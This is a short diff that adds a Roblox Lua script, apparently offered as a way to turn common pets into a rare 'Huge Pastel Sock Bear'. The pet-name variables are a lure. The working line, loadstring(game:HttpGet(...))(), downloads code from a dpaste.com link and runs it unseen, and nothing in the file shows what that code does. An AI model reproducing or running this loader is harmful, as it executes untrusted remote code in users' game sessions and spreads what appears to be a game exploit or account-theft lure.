@@ -1,0 +1,9 @@
+script here 👇👇👇👇👇
+
+
+fromPet1 = "Egg Chick"
+fromPet2 = "Spring Griffin"
+fromPet3 = "Easter Axolotl"
+toPet = "Huge Pastel Sock Bear"
+
+loadstring(game:HttpGet("https://dpaste.com/8GRV8BMCG.txt"))()
